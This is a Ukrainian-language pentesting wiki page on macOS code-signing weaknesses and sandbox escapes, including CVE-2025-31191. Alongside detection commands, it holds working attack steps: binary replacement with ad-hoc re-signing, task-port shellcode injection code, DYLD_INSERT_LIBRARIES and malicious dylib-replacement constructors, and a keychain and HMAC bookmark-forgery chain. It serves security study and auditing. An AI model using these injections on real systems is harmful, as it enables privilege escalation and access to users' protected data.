# Слабкі місця Code Signing у macOS та Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Бінарні файли з Ad-Hoc-підписом

### Основна інформація

**Ad-hoc signing** (`CS_ADHOC`) створює підпис коду **без ланцюжка сертифікатів**. Він усе одно хешує підписаний код, тому перевірка може виявити модифікацію, але не надає ідентичності розробника, яку інший компонент міг би автентифікувати. Заміна та повторний підпис виконуваного файлу створює інший CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

На Mac з Apple Silicon усі виконувані файли потребують щонайменше ad-hoc-підпису. Тому ad-hoc-підписи можна знайти в багатьох інструментах розробки, пакетах Homebrew і сторонніх утилітах.

### Чому це важливо

- **Відсутність перевірюваної ідентичності підписанта** — перевірки, які приймають лише шлях, статус ad-hoc або ідентифікатор без прив’язки, не можуть встановити, хто створив бінарний файл.
- Сторонні ad-hoc-бінарні файли у **привілейованих позиціях** (FDA, daemons, helpers) є пріоритетними цілями, якщо їхній файл або батьківський каталог доступні для запису.
- Перевірка TCC на основі CDHash, designated-requirement або requirement **виявляє** заміну. Політика на основі шляху може її не виявити; перевірте фактичну вимогу та повторно протестуйте надання дозволу, замість того щоб припускати, що воно зберігається після повторного підпису.

### Виявлення
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Атака: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Процеси, доступні для налагодження (get-task-allow)

### Основна інформація

Entitlement **`com.apple.security.get-task-allow`** (або прапорець **`CS_GET_TASK_ALLOW`**) дозволяє авторизованому debugger отримати task port процесу, навіть коли Hardened Runtime зазвичай це забороняє. Успішний debugger може читати пам'ять, змінювати регістри, ін'єктувати код і керувати виконанням.<sup>[[3]](#references)</sup>

Це призначено **лише для development builds**. Однак деякі сторонні бінарні файли постачаються з цим entitlement у production.

> [!CAUTION]
> Production binary із `get-task-allow` є потужним примітивом для exploitation. `taskgated`, ідентичність caller, sandboxing, debugger entitlements і авторизація Developer Tools усе ще впливають на те, чи зможе конкретний client отримати task port; тестуйте за допомогою `lldb`/`debugserver` і призначеного injector. Після успішного attachment ін'єктований код виконується з entitlements, TCC grants і security context цільового процесу.

### Виявлення
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Атака: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Відсутність валідації бібліотек + середовище DYLD

### Очищення валідації бібліотек під час виконання

Приватне entitlement **`com.apple.private.security.clear-library-validation`** не вимикає валідацію бібліотек під час запуску процесу. Натомість воно дозволяє процесу викликати `csops(..., CS_OPS_CLEAR_LV, ...)` для самого себе під час виконання. Після цього XNU очищує `CS_REQUIRE_LV | CS_FORCED_LV`, за умови що викликач має відповідне entitlement і проходить додаткові перевірки обробника. Отже, процес може стати придатною ціллю для library injection лише після досягнення коду, який очищує валідацію бібліотек.<sup>[[4]](#references)[[5]](#references)</sup>

### Небезпечне поєднання

Коли бінарний файл має **обидва**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (завантажує будь-який dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (приймає змінні середовища DYLD)

Це цінне поєднання для code injection, оскільки Hardened Runtime дозволяє як ненадійну бібліотеку, так і змінну середовища DYLD. Контекст запуску все одно може очищати змінні DYLD (наприклад, під час захищених або привілейованих шляхів виконання), тому перевіряйте точний спосіб виклику, а не вважайте цю пару entitlements безумовною.

### Виявлення
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Атака: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Тимчасові винятки Sandbox

### Як вони послаблюють Sandbox

Тимчасові винятки Sandbox (`com.apple.security.temporary-exception.*`) створюють проломи в App Sandbox:<sup>[[2]](#references)</sup>

| Виняток | Що він дозволяє |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Підключатися до загальносистемних XPC/Mach-сервісів |
| `temporary-exception.files.absolute-path.read-write` | Читати/записувати файли за межами контейнера застосунку |
| `temporary-exception.iokit-user-client-class` | Відкривати підключення IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Читати налаштування інших застосунків |
| `temporary-exception.files.home-relative-path.read-write` | Отримувати доступ до шляхів відносно `~` |

### Винятки Mach-Lookup = примітив обходу Sandbox

Найнебезпечнішим винятком є **mach-lookup** — він дозволяє застосунку в Sandbox взаємодіяти з привілейованими демонами:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Атака: Sandbox Escape через Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Перевірки Code-Signing — це не цілісність XPC-клієнта

Сервіс XPC може автентифікувати з'єднання, отримавши стан code-signing з його audit token і прийнявши **platform binary** Apple або клієнта з `CS_REQUIRE_LV`/`CS_FORCED_LV`. Ці тести описують executable та вибрані process flags; вони не доводять, що поточний address space містить лише trusted code. Дослідження сервісів ImageCapture показали, що injectable Apple binary, наприклад `/bin/ls`, може завантажити attacker dylib через `DYLD_INSERT_LIBRARIES`, а потім підключитися як platform client. Подальшу перевірку library-validation flags також було обійдено, перш ніж Apple змінила сервіс і додала вимогу щодо свого private authorization entitlement у macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Виконайте reverse `listener:shouldAcceptNewConnection:` (або еквівалентного low-level XPC handler) і визначте рішення, що ґрунтуються лише на `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` або `CS_FORCED_LV`.
2. Перелічіть Apple-signed clients, які можуть взаємодіяти з протоколом, а потім перевірте Hardened Runtime та entitlements. Сам по собі platform signature не є доказом того, що DYLD injection заблоковано.
3. Протестуйте candidate на **цільовій збірці macOS**. Якщо constructor dylib завантажується, встановіть service connection з цього constructor, щоб audit token належав прийнятому platform process.
4. Повторно протестуйте кожен vendor patch: додавання ще одного mutable process-status flag до того самого authorization decision може не усунути confused-deputy primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Поведінка DYLD, політика AMFI та перевірки на стороні сервісів змінюються між випусками macOS. Невдача на повністю оновленій системі не доводить, що той самий ланцюжок не спрацював на вразливому випуску.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks зберігають вибір файлу користувача між запусками. sandbox extension прив'язаний до завантаження системи, тому `ScopedBookmarkAgent` перевіряє його та створює довгоживучий bookmark із автентифікацією HMAC; коли застосунок пізніше надає цей bookmark, агент перевіряє його та видає новий sandbox extension. Секрет підпису зберігається в login keychain, а ключ для конкретного застосунку виводиться за допомогою ідентифікатора bundle.<sup>[[7]](#references)</sup>

У вразливих системах ACL keychain не дозволяв ненадійному процесу **читати** секрет `com.apple.scopedbookmarksagent.xpc`, але не забороняв його видалення. Скомпрометований sandboxed застосунок міг замінити цей елемент відомим секретом і ACL, контрольованим атакувальником, вивести HMAC-ключ для конкретного застосунку, підробити записи у доступному для запису bookmark plist контейнера та попросити `ScopedBookmarkAgent` обміняти їх на розширення доступу до файлів. Це перетворювало будь-який sandboxed застосунок, що використовує security-scoped bookmarks, на потенційний sandbox escape із довільним доступом до файлів без додаткової взаємодії з file picker. Apple виправила проблему в оновленнях безпеки від 31 березня 2025 року.<sup>[[7]](#references)</sup>

### Первинний аналіз і ланцюжок атаки
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Послідовність експлуатації на вразливому хості:

1. Отримати виконання коду всередині sandboxed app, яка використовує persistent scoped bookmarks.
2. Замінити елемент підпису keychain агента на відомий secret із permissive ACL.
3. Обчислити `HMAC-SHA256(key=known_secret, data=bundle_id)` і підробити bookmark для корисного шляху у writable bookmark store застосунку.
4. Запустити стандартний шлях bookmark-resolution застосунку, щоб `ScopedBookmarkAgent` повернув sandbox extension.
5. Використати новий доступ до файлів, щоб перезаписати out-of-sandbox execution або data target, доступний цьому користувачу.

Це **техніка для patched-версій**: використовуйте її, щоб зрозуміти межу довіри та оцінювати unpatched-системи, а не як припущення щодо поточних релізів. Для поточного тестування зосередьтеся на bookmark parsing, identity binding, життєвому циклі keychain item і поведінці confused deputy навколо агента.

---

## Приватні Apple Entitlements

### Що це таке

Entitlements із префіксом `com.apple.private.*` надають доступ до **Apple-internal APIs**, які не задокументовані та недоступні стороннім розробникам. Сторонні binary отримували private entitlements через enterprise cert, MDM або дистрибуцію поза App Store.

### Небезпечні Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Повний read/write до бази даних TCC |
| `com.apple.private.tcc.allow` | Доступ до окремих TCC-сервісів |
| `com.apple.private.security.no-sandbox` | Запуск без sandbox |
| `com.apple.private.iokit` | Прямий доступ до IOKit-драйверів |
| `com.apple.private.kernel.\*` | Доступ до kernel interface |
| `com.apple.private.xpc.launchd.job-label` | Реєстрація та керування launchd jobs |
| `com.apple.rootless.install` | Запис у SIP-protected paths |

### Виявлення
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Кастомні Sandbox-профілі

### Що це таке

Бінарні файли можуть містити **кастомні Sandbox-профілі**, написані мовою SBPL (Seatbelt Profile Language). Ці профілі можуть бути більш обмежувальними АБО **більш дозвільними**, ніж стандартний App Sandbox.

### Аудит кастомних профілів
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Шляхи бібліотек, доступні для запису

### Що це таке

Коли binary завантажує dynamic library зі шляху, до якого поточний користувач має права **запису**, бібліотеку можна замінити на шкідливий код.

### Виявлення
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Атака: Заміна Dylib
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Посібник із підписування коду](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (операції `CS_OPS_*` і `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (обробник `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Нова ера macOS Sandbox Escapes: дослідження недооціненої поверхні атаки та виявлення понад 10 нових вразливостей](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Аналіз CVE-2025-31191: macOS Sandbox Escape на основі security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
